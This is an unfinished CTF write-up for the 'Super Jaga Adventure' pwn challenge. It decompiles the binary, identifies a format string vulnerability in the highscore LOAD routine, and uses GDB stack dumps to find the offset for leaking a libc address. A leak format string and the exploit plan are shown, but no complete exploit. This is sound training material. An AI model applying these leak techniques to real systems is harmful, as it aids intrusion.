# Super Jaga Adventure

---

> Description: ?
> 
> Difficulty: Medium
>
> Files: [super_jaga_adventure.zip](./pwn_super_jaga_adventure.zip)

---

## Playing Around

If we try to run the binary, we will be presented with nothing. If we try to input something, it prints "Invalid Option".

```python
$ ./jaga
asd
Invalid option
asd
Invalid option
```

Let's decompile our program and see what's there

## Static Analysis

After cleaning up the code a little, we have the following code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-124h]
  char highscore_name[270]; // [rsp+10h] [rbp-120h] BYREF
  char command[5]; // [rsp+11Eh] [rbp-12h] BYREF
  char score_str[5]; // [rsp+123h] [rbp-Dh] BYREF
  unsigned __int64 v8; // [rsp+128h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup_IO();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        memset(command, 0, sizeof(command));
        scanf("%4s", command);
        if ( strcmp(command, "LOAD") )
          break;
        puts("LOADRDY");
        for ( i = 0; i < num_of_highscores; ++i )
        {
          printf(&highscores + 264 * i);
          putchar(35);
          printf("%d\n", dword_4164[66 * i]);
        }
        puts("LOADEND");
      }
      if ( strcmp(command, "SAVE") )
        break;
      puts("SAVERDY");
      if ( num_of_highscores > 9 )
        --num_of_highscores;
      qmemcpy(highscore_name, &highscores + 264 * num_of_highscores, 264uLL);
      scanf("%255s", highscore_name);
      *&highscore_name[256] = strlen(highscore_name);
      scanf("%4s", score_str);
      *&highscore_name[260] = atoi(score_str);
      qmemcpy(&highscores + 264 * num_of_highscores, highscore_name, 0x108uLL);
      if ( num_of_highscores <= 9 )
        ++num_of_highscores;
      selectionSort(&highscores, num_of_highscores);
      puts("SAVEEND");
    }
    if ( !strcmp(command, "QUIT") )
      break;
    puts("Invalid option");
  }
  return 0;
}
```

If we analyze the code above, we can see that the program has the `LOAD` and `SAVE` feature.

The `SAVE` feature reads in 2 strings, and save them in a variable called `highscores`.

The `LOAD` feature prints out the highscores with a `printf()` function. This is vulnerable to format string attack.

## Exploit

Since we have identified the vulnerability, we can start planning how we are going to exploit it

1. Leak a LIBC address
2. Find the LIBC that is running on the remote server.
3. Find a place to write to

We can leak addresses off the stack with the `%n$p` format string where `n` is the n-th argument to printf.

The first 6 arguments are in RDI, RSI, RDX, RCX, R8, R9 and the rest are in the stack.

The candidate for our LIBC leak will be `__libc_start_main_ret` which is stored as the return address to the `main` function.

However, we do not know what `n` will be, in order to leak that address. We can solve this with some GDB and guess and check.

## Finding the offset to __libc_start_main_ret

We will open the binary in GDB, and then set a breakpoint at `printf+170`, which is at the call to `_vfprintf_internal` symbol which is the internal call to `printf`.

We can then run the binary, and `SAVE` our format string.

```
SAVE
SAVERDY
%10$p.%11$p.%12$p
0
SAVEEND
```

We can then run the `LOAD` and hit our breakpoint right before the format leak is printed.

```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e36d28 <printf+152>     mov    DWORD PTR [rsp], 0x8
   0x7ffff7e36d2f <printf+159>     mov    rdi, QWORD PTR [rax]
   0x7ffff7e36d32 <printf+162>     mov    DWORD PTR [rsp+0x4], 0x30
 → 0x7ffff7e36d3a <printf+170>     call   0x7ffff7e4b860
   ↳  0x7ffff7e4b860                  endbr64
      0x7ffff7e4b864                  push   rbp
      0x7ffff7e4b865                  mov    rbp, rsp
      0x7ffff7e4b868                  push   r15
      0x7ffff7e4b86a                  push   r14
      0x7ffff7e4b86c                  mov    r14, rdx
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x7ffff7e4b860 (
   $rdi = 0x00007ffff7fc26a0 → 0x00000000fbad2887,
   $rsi = 0x0000555555558168 → "%10$p.%11$p.%12$p",
   $rdx = 0x00007fffffffbe70 → 0x0000003000000008,
   $rcx = 0x0000000000000000
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "jaga", stopped 0x7ffff7e36d3a in printf (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e36d3a → printf()
[#1] 0x555555555583 → mov edi, 0x23
[#2] 0x7ffff7df9083 → __libc_start_main()
[#3] 0x5555555551ae → hlt
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Now, before the format leak is printed, we will print out the contents of our stack until we can see our objective, aka `__libc_start_main_ret`. Afterwards, we can let the program resume to see what the format leak is.

```
gef➤  telescope
0x00007fffffffbe70│+0x0000: 0x0000003000000008   ← $rdx, $rsp
0x00007fffffffbe78│+0x0008: 0x00007fffffffbf50  →  0x0000034000000340
0x00007fffffffbe80│+0x0010: 0x00007fffffffbe90  →  0x0000000000000000
0x00007fffffffbe88│+0x0018: 0xb3084ef389aae800
0x00007fffffffbe90│+0x0020: 0x0000000000000000
0x00007fffffffbe98│+0x0028: 0x00007fffffff98b0  →  "10\n0.(nil).(nil)"
0x00007fffffffbea0│+0x0030: 0x0000555555558060  →  "%10$p.%11$p.%12$p"
0x00007fffffffbea8│+0x0038: 0x0000000000000000
0x00007fffffffbeb0│+0x0040: 0x0000000000000003
0x00007fffffffbeb8│+0x0048: 0x0000000000000003
gef➤
0x00007fffffffbec0│+0x0050: 0x0000000000000d68 ("h\r"?)
0x00007fffffffbec8│+0x0058: 0x0000000000000023 ("#"?)
0x00007fffffffbed0│+0x0060: 0x00007ffff7fc26a0  →  0x00000000fbad2887
0x00007fffffffbed8│+0x0068: 0x0000555555558020  →  0x00007ffff7fc26a0  →  0x00000000fbad2887
0x00007fffffffbee0│+0x0070: 0x00007ffff7fc85c0  →  0x00007ffff7fc85c0  →  [loop detected]
0x00007fffffffbee8│+0x0078: 0x0000000000000000
0x00007fffffffbef0│+0x0080: 0x0000000000000000
0x00007fffffffbef8│+0x0088: 0x00007ffff7e65e93  →  <_IO_file_overflow+275> cmp eax, 0xffffffff
0x00007fffffffbf00│+0x0090: 0x00007ffff7fc26a0  →  0x00000000fbad2887
0x00007fffffffbf08│+0x0098: 0x0000000000000023 ("#"?)
gef➤
0x00007fffffffbf10│+0x00a0: 0x0000555555558020  →  0x00007ffff7fc26a0  →  0x00000000fbad2887
0x00007fffffffbf18│+0x00a8: 0x00007ffff7e5b302  →  <putchar+130> mov r8d, eax
0x00007fffffffbf20│+0x00b0: 0x0000555555555780  →   endbr64
0x00007fffffffbf28│+0x00b8: 0x0000555555555780  →   endbr64
0x00007fffffffbf30│+0x00c0: 0x00007fffffffc080  →  0x0000000000000000
0x00007fffffffbf38│+0x00c8: 0x0000555555555180  →   endbr64
0x00007fffffffbf40│+0x00d0: 0x00007fffffffc170  →  0x0000000000000001
0x00007fffffffbf48│+0x00d8: 0x0000555555555583  →   mov edi, 0x23
0x00007fffffffbf50│+0x00e0: 0x0000034000000340
0x00007fffffffbf58│+0x00e8: 0x0000000100000380
gef➤
0x00007fffffffbf60│+0x00f0: "%10$p.%11$p.%12$p"
0x00007fffffffbf68│+0x00f8: "1$p.%12$p"
0x00007fffffffbf70│+0x0100: 0x0000000000000070 ("p"?)
0x00007fffffffbf78│+0x0108: 0x0000000000000000
0x00007fffffffbf80│+0x0110: 0x0000000000000000
0x00007fffffffbf88│+0x0118: 0x0000000000000000
0x00007fffffffbf90│+0x0120: 0x0000000000000000
0x00007fffffffbf98│+0x0128: 0x0000000000000000
0x00007fffffffbfa0│+0x0130: 0x0000000000000000
0x00007fffffffbfa8│+0x0138: 0x0000000000000000
gef➤
0x00007fffffffbfb0│+0x0140: 0x0000000000000000
0x00007fffffffbfb8│+0x0148: 0x0000000000000000
0x00007fffffffbfc0│+0x0150: 0x0000000000000000
0x00007fffffffbfc8│+0x0158: 0x0000000000000000
0x00007fffffffbfd0│+0x0160: 0x0000000000000000
0x00007fffffffbfd8│+0x0168: 0x0000000000000000
0x00007fffffffbfe0│+0x0170: 0x0000000000000000
0x00007fffffffbfe8│+0x0178: 0x0000000000000000
0x00007fffffffbff0│+0x0180: 0x0000000000000000
0x00007fffffffbff8│+0x0188: 0x0000000000000000
gef➤
0x00007fffffffc000│+0x0190: 0x0000000000000000
0x00007fffffffc008│+0x0198: 0x0000000000000000
0x00007fffffffc010│+0x01a0: 0x0000000000000000
0x00007fffffffc018│+0x01a8: 0x0000000000000000
0x00007fffffffc020│+0x01b0: 0x0000000000000000
0x00007fffffffc028│+0x01b8: 0x0000000000000000
0x00007fffffffc030│+0x01c0: 0x0000000000000000
0x00007fffffffc038│+0x01c8: 0x0000000000000000
0x00007fffffffc040│+0x01d0: 0x0000000000000000
0x00007fffffffc048│+0x01d8: 0x0000000000000000
gef➤
0x00007fffffffc050│+0x01e0: 0x0000000000000000
0x00007fffffffc058│+0x01e8: 0x0000000000000000
0x00007fffffffc060│+0x01f0: 0x0000000000000011
0x00007fffffffc068│+0x01f8: 0x4f4c555555555180
0x00007fffffffc070│+0x0200: 0x0000000030004441 ("AD"?)
0x00007fffffffc078│+0x0208: 0xb3084ef389aae800
0x00007fffffffc080│+0x0210: 0x0000000000000000   ← $rbp
0x00007fffffffc088│+0x0218: 0x00007ffff7df9083  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffc090│+0x0220: 0x00007ffff7ffc620  →  0x0006000900000000
0x00007fffffffc098│+0x0228: 0x00007fffffffc178  →  0x00007fffffffc43d  →  "/home/elmo/STF/PWN/pwn_super_jaga_adventure/jaga"
gef➤  c
Continuing.
0x70.(nil).(nil)#

```

As you can see, the format leak was `0x70`, `nil`, `nil`. So we want to look in the stack for 3 consecutive values that are `0x70`, `0x0` and `0x0`.

After looking through, we can find it at `RSP+0x100` on the stack, while our `__libc_start_main_ret` is on `RSP+0x218`.

Since `RSP+0x100` corresponds with offset `n=10`, we can do the math

```
10+((0x218-0x100)//8) = 45
```

Thus we can derive that `__libc_start_main_ret` will be at offset `n=45`. Some other relevant addresses will be the stack address which will be at offset `n=47`.

With our leak, we can also determine the libc version on the remote server.

This is important since the libc version will determine the offsets of functions within the libc which is crucial when we are getting our shell.


_this writeup will be completed when im less lazy, or never_
